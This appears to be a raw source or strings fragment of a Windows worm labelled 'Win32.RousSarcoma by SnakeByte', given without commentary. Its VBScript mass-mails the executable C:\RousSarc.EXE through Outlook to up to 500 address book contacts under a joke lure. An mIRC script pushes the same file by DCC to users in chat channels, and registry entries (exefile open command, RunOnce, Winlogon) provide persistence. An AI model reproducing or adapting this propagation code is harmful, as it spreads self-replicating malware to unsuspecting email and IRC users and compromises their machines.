Win32.RousSarcoma by SnakeByte 

exefile\shell\open\command RousSarc.EXE "%1" 

On Error Resume Next
Dim R
Set RS=CreateObject("Outlook.Application")
For R=1 To 500
Set Mail=RS.CreateItem(0)
Mail.to=RS.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="Funny Thing !"
Mail.Body="Take a look at this and just start laughing !"
Mail.Attachments.Add("C:\RousSarc.EXE")
Mail.Send
Next
RS.Quit

C:\RousSarc.vbs SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths Path 
RousSarcoma RousSarcoma

CreateFileA
CloseHandle
WriteFile 
CreateProcessA 
C:\RousSarc.EXE

SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon 
SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce *.EXE 

[script]
n0=on 1:join:#: { if ( $nick == $me ) halt
n1=     else .timer 1 30 .dcc send $nick C:\RousSarc.EXE }
n2=on *:filesent:*.*: { if ( $nick != $me ) .dcc send $nick C:\RousSarc.EXE }
mirc.ini 
RousSarc.ini